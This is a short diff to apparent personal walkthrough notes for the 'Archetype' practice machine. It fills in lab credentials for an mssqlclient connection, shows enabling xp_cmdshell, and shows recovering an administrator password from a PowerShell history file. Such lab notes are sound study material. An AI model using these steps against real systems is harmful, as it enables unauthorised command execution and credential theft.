@@ -23,7 +23,7 @@
 			- IPC\$ -> nothing
 
 - SQL
-	- connect to SQL: `mssqlclient ARCHETYPE\sql_svc:<password>@<IP> -windows-auth`
+	- connect to SQL: `mssqlclient ARCHETYPE\sql_svc:M3g4c0rp123@<IP> -windows-auth`
 	- set up xp_cmdshell
 		- ```
 			EXEC sp_configure 'Show Advanced Options', 1;
@@ -42,7 +42,7 @@
 - privilege escalation
 	- check frequently access/execute file:
 		- `type    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
-		- -> net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!! 
+		- -> `net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!! `
 		- Administrator: `Administrator`
 		- Password: `MEGACORP_4dm1n!!`
 
